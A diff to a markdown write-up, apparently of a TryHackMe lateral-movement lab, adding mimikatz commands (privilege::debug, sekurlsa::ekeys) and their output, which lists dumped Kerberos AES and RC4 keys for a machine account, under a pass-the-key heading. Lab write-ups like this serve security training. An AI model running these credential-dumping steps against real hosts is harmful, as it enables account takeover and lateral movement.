@@ -1030,7 +1030,33 @@ Cached Tickets: (1)
 za\t2_felicia.dean@THMJMP2 c:\tools>     
 ```
 #### Next Kerberos keys (RC4/AES) → Pass‑the‑Key / Overpass‑the‑Hash
-
+```
+mimikatz # privilege::debug                                                                                                                                 
+Privilege '20' OK                                                                                                          
+mimikatz # sekurlsa::ekeys       
+```
+No results usable all seem to be THMIIS not THMJMP2.
+```
+Authentication Id : 0 ; 999 (00000000:000003e7)                             
+Session           : UndefinedLogonType from 0                               
+User Name         : THMIIS$                                                 
+Domain            : ZA                                                      
+Logon Server      : (null)                                                  
+Logon Time        : 7/5/2026 5:12:42 PM                                     
+SID               : S-1-5-18                                                
+                                                                            
+         * Username : thmiis$                                               
+         * Domain   : ZA.TRYHACKME.COM                                      
+         * Password : (null)                                                
+         * Key List :                                                       
+           aes256_hmac       e538dd717e1359e4cd9b331c8ba388cafabc813a364070b
+81f9f148e66e61f41                                                           
+           rc4_hmac_nt       a0298599d3c65498a06c923b92385d99               
+           rc4_hmac_old      a0298599d3c65498a06c923b92385d99               
+           rc4_md4           a0298599d3c65498a06c923b92385d99               
+           rc4_hmac_nt_exp   a0298599d3c65498a06c923b92385d99               
+           rc4_hmac_old_exp  a0298599d3c65498a06c923b92385d99    
+```
 
 Your goal:
 - Extract authentication material for t1_toby.beck  
